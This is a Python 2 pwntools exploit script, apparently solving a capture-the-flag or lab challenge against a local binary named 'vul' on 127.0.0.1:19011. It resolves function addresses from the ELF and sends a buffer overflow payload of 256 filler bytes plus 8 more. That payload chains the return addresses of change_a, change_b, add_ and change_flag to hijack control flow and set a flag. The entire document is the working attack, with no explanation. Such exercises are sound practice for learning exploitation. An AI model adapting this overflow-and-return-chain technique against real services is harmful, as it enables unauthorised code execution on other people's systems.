#!/usr/bin/env python
#coding:utf-8
from pwn import *
import cle

p = remote('127.0.0.1',19011)
elf = ELF('../vul')

text_addr = elf.symbols['_start']

print hex(text_addr)

main_addr = elf.symbols['main']
add_addr = elf.symbols['add_']
change_a_addr = elf.symbols['change_a']
change_b_addr = elf.symbols['change_b']
change_flag_addr = elf.symbols['change_flag']
if_addr = main_addr + 0x3e

print hex(main_addr)
print hex(add_addr)
print hex(change_a_addr)
print hex(change_b_addr)
print hex(change_flag_addr)

fop =(
	p64(change_a_addr)
	+ p64(change_b_addr)
	+ p64(add_addr)
	+ p64(change_flag_addr)
	+ p64(if_addr)
	)

payload = 'a'* 256 + 'b'*8 + fop

p.sendline(payload)
